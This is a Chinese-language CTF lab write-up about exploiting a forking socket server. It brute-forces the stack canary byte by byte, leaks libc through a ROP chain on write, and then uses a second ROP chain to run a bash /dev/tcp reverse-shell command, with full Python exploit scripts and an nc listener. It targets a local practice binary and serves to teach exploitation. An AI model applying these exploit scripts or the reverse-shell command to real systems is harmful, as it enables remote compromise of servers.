---
title: 爆破canary+反弹shell
top: 30
tags:
  - 爆破canary
  - lab
  - trick
  - 反弹shell
categories: 私房菜
password: he13716649461
abbrlink: 3eb93c75
---

### README:

>    Canary goes crazy. Never die. How can we efficiently guess? Try this challenge
>    in your local environment, first!



### 保护策略：

![image-20221115231238486](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211152312621.png)

### 程序分析：

![image-20221115231512783](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211152315894.png)

首先程序先判断了是否传入了命令行参数，而这个参数的就是之后要开启的ip和port。上面这段代码需要关注的是socket bind listen accpet fork这五个函数。

简单描述一下的话是socket函数创建了一个套接字，然后bind函数将套接字与ip和port所绑定(ip和port是传入的命令行参数)，接着用listen让这个socket进入被动监听状态，再通过 accept() 函数来接收客户端的请求，最后程序进入永真循环，不断的fork子进程，然后只有子进程能够触发break跳出循环触发之后的vuln函数。

这里其实就是运行本程序的主机作为一个服务器，然后我们需要通过nc连接上服务器里监听的端口，去往下执行vlun函数(连进来的时候，直接进的就是子进程，因为父进程开的端口直接又被close掉了进不来)，而子进程是继承的父进程的环境变量，因此fork出来的进程canary以及libc地址都是始终不变的(只要父进程不崩溃的话)



连进来之后子函数主要执行的是vuln函数(如下)

![image-20221116102334205](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211161023295.png)

存在溢出但是程序有canary保护，考虑到不断的fork出来的子进程推断这里是要爆破canary的。如果canary爆破出来后，就可以很舒服的打一个rop了。

### 利用思路：

#### 启动服务端的程序

首先启动我们服务端的程序(需要用root权限启动)，我这里选择了监听 127.0.0.1 1000，所以我们先写一个脚本如下

```py
from tools import *
context.log_level='debug'
p=process(["./a","139637976794088"])
p.interactive()
```

#### 爆破canary

爆破canary的思路很简单，我们不断的去覆盖canary的某位字节，当程序此次不崩溃的时候就说明爆破成功了该位字节，接着去爆破下一位。此处用一个for循环嵌套处理即可脚本如下

```py
def leak_canary():
    canary="\x00"
    offset=0xc8
    for j in range(7):
        for k in range(0xff): 
            p=remote("127.0.0.1",1000)
            payload='a'*offset+canary+chr(k)
            p.sendafter("Give me something...\n",payload)
            try:
                a=p.recv(timeout=0.2)
                if a==b"Bye\n":
                    canary+=chr(k)
                    print(canary)
                    break
            except:
                pass
            p.close()
    return canary
```



#### 泄露libc地址

常规rop泄露libc地址，没什么好说的。由于fork出来的子进程的libc地址都一样，所以我们泄露出来之后，直接断开连接即可。之后的rop再往上连就行

```py
p=remote("127.0.0.1",1000)   
pop_rdi=0x0000000000400c13
pop_rsi_r15=0x0000000000400c11
ret_addr=0x400BA5
bss_addr=0x6010B0
payload=b'a'*0xc8+canary.encode("latin1")+p64(0xdeadbeef)+p64(pop_rdi)+p64(4)+p64(pop_rsi_r15)+p64(e.got['write'])+p64(0xdeadbeef)+p64(e.plt['write'])
p.sendafter("Give me something...\n",payload)
write_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
sys_addr,bin_sh_addr=local_search('write',write_addr,libc)
p.close()
```



#### 反弹shell

因为最终是要拿到服务端的shell，如果我们单纯的打个rop执行system(“/bin/sh\x00”)，这仅仅是在服务端开了一个shell，但是这个shell跟我们没有任何关系。要想去拿到服务端的shell需要用到反弹shell(平常pwn题之所以执行system(“/bin/sh\x00”)能拿到shell是因为服务器那边监听的端口上挂载了这个程序)。

反弹shell的命令也很简单，如下

```shell
bash -c 'bash -i &> /dev/tcp/127.0.0.1/6666 0>&1'
```

原理如下(转自[here](https://blog.csdn.net/qqchaozai/article/details/111594218#:~:text=%E5%8F%8D%E5%BC%B9shell%20%28reverse%20shell%29%EF%BC%9A%E4%B8%80%E7%A7%8D%E8%AE%A9%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E6%89%A7%E8%A1%8C%E6%9C%AC%E5%9C%B0shell%E7%9A%84%E7%A8%8B%E5%BA%8F,1%20%E5%8E%9F%E7%90%86%20%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E7%9B%91%E5%90%AC%E4%B8%80%E4%B8%AATCP%2FUDP%E7%AB%AF%E5%8F%A3%EF%BC%8C%E6%9C%AC%E5%9C%B0%E7%B3%BB%E7%BB%9F%E8%BF%90%E8%A1%8C%E5%8F%8D%E5%BC%B9shell%EF%BC%8C%E5%8F%8D%E5%BC%B9shell%E4%BC%9A%E8%BF%9E%E6%8E%A5%E8%AF%A5%E7%AB%AF%E5%8F%A3%EF%BC%8C%E5%B9%B6%E6%8E%A5%E6%94%B6%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E5%8F%91%E9%80%81%E7%9A%84shell%E6%8C%87%E4%BB%A4%EF%BC%8C%E6%89%A7%E8%A1%8C%E4%B9%8B%E5%90%8E%E5%86%8D%E5%B0%86%E6%8C%87%E4%BB%A4%E7%9A%84%E8%BE%93%E5%87%BA%E6%B5%81%E8%BD%AC%E5%8F%91%E7%BB%99%E8%BF%9C%E7%A8%8B%E7%B3%BB%E7%BB%9F%E3%80%82))    bash -c的意思是使用shell去运行后面的命令

![image-20221116120330360](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211161203577.png)

我们第二次的rop先去调用一个read往bss上把这个命令写上去，随后调用system将该命令执行。

在这之前我们先监听6666这个端口命令如下:

```
nc -lvvp 6666
```

最终成功反弹shell的情况如下：

![image-20221116132608483](https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202211161326743.png)



### EXP：

#### 服务端

```py
from tools import *
#context.log_level='debug'
p=process(["./a","139637976794088"])
p.interactive()
```

#### 客户端

```py
from tools import *
context.log_level='debug'
e=ELF("./a")
libc=ELF("/lib/x86_64-linux-gnu/libc.so.6")
def leak_canary():
    canary="\x00"
    offset=0xc8
    for j in range(7):
        for k in range(0xff): 
            p=remote("127.0.0.1",1000)
            payload='a'*offset+canary+chr(k)
            p.sendafter("Give me something...\n",payload)
            try:
                a=p.recv(timeout=0.2)
                if a==b"Bye\n":
                    #pause()
                    canary+=chr(k)
                    print(canary)
                    #pause()
                    break
            except:
                pass
            p.close()
    return canary        

canary=leak_canary()

p=remote("127.0.0.1",1000)   
pop_rdi=0x0000000000400c13
pop_rsi_r15=0x0000000000400c11
ret_addr=0x400BA5
bss_addr=0x6010B0
payload=b'a'*0xc8+canary.encode("latin1")+p64(0xdeadbeef)+p64(pop_rdi)+p64(4)+p64(pop_rsi_r15)+p64(e.got['write'])+p64(0xdeadbeef)+p64(e.plt['write'])
p.sendafter("Give me something...\n",payload)
write_addr=u64(p.recvuntil(b'\x7f')[-6:].ljust(8,b'\x00'))
sys_addr,bin_sh_addr=local_search('write',write_addr,libc)
p.close()

p=remote("127.0.0.1",1000)
payload=b'a'*0xc8+canary.encode("latin1")+p64(0xdeadbeef)+p64(ret_addr)+p64(pop_rdi)+p64(4)
payload+=p64(pop_rsi_r15)+p64(bss_addr)+p64(0)+p64(e.plt['read'])+p64(pop_rdi)+p64(bss_addr)+p64(sys_addr)
p.sendafter("Give me something...\n",payload)

sleep(0.3)
p.sendline("bash -c 'bash -i &> /dev/tcp/127.0.0.1/6666 0>&1'\x00")
p.interactive()
```

### 题目附件：

链接: https://pan.baidu.com/s/1RwREHC8sfsuJue88JksT4w?pwd=eky4 提取码: eky4